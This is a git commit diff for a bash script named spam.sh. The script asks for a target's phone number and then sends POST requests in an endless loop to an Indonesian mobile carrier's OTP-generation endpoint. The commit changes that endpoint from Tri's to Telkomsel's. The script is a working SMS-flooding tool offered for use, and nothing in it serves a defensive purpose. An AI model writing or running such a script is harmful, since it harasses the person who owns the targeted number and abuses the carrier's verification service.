d5f7e84fa1b152553429d9f892ad3439538c695c
fahribasic1799 <fahriyadi123@gmail.com>
2018-11-05 18:26:47 +0700

    Update spam.sh

--- spam.sh
+++ spam.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 read -p 'Nomer Target[Example 0896xxxxx]: ' nmr
-while :;do curl -X POST -d "msisdn=$nmr" https://registrasi.tri.co.id/daftar/generateOTP;done
+while :;do curl -X POST -d "msisdn=$nmr" https://www.telkomsel.com/daftar-ulang-prepaid?ch=WEB/generateOTP;done
